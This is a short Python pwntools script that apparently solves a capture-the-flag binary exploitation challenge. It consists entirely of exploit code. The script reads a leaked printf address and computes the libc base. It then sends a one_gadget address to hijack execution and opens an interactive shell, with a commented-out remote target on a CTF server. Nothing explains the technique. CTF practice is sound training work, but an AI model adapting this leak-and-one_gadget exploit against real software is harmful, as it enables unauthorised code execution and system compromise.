from pwn import *
io = process('./pwn')
#io = remote('pwn.challenge.ctf.show',28227)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = 0x10a2fc
printf_libc = libc.symbols['printf']
io.recvuntil('this:')
printf = int(io.recv(14),16)
libc_base = printf-printf_libc
io.sendline(str(one_gadget+libc_base))
io.recv()
io.interactive()
